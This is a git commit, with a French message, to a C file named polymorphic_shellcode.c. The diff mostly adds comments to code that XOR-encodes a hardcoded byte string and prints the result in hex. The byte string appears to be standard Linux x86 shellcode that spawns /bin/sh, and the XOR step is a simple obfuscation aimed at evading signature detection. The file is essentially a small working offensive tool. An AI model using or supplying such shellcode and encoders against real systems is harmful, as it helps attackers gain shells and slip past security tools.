e7c7d706289da85791686e93d7cca91eee8075e1
Potite_Bulle <135218431+PotiteBulle@users.noreply.github.com>
2025-02-07 21:20:26 +0100

    feat: ajout du fichier polymorphic_shellcode.c pour générer des shellcodes polymorphes
    - Implémentation d'un chiffrement XOR simple pour rendre le shellcode polymorphe.
    - Affichage du shellcode généré en format hexadécimal.
    - Ajout de commentaires détaillés pour expliquer le processus de polymorphisme.

--- ShellcodePolymorphic/polymorphic_shellcode.c
+++ ShellcodePolymorphic/polymorphic_shellcode.c
@@ -3,16 +3,20 @@
 #include <string.h>
 
 void polymorphic_shellcode(unsigned char *shellcode, int length) {
+    // Chiffrement XOR simple pour rendre le shellcode polymorphe
     for (int i = 0; i < length; i++) {
-        shellcode[i] ^= 0xAA; // Chiffrement XOR simple
+        shellcode[i] ^= 0xAA; // Clé XOR : 0xAA
     }
 }
 
 int main() {
-    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; // Remplacez par votre shellcode
+    // Shellcode à rendre polymorphe (remplacez par votre propre shellcode)
+    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
+    // Applique le chiffrement XOR pour rendre le shellcode polymorphe
     polymorphic_shellcode(shellcode, sizeof(shellcode) - 1);
 
+    // Affichage du shellcode polymorphe en format hexadécimal
     printf("Polymorphic shellcode generated:\n");
     for (int i = 0; i < sizeof(shellcode) - 1; i++) {
         printf("\\x%02x", shellcode[i]);
